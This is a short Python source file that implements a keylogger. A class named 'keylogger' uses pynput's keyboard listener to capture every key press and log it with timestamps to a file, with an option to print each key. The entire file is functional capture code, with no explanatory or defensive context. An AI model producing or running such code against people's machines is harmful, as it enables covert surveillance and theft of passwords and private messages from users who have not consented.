from pynput.keyboard import Key, Listener
import logging

class keylogger:
    def start(logfile_path, allow_print):
        logging.basicConfig(filename=logfile_path, level=logging.DEBUG, format=" %(asctime)s - %(message)s")

        def on_press(key):
            logging.info(str(key))
            if allow_print == True:
                print(str(key))
            else:
                pass

        with Listener(on_press=on_press) as listener:
            listener.join()
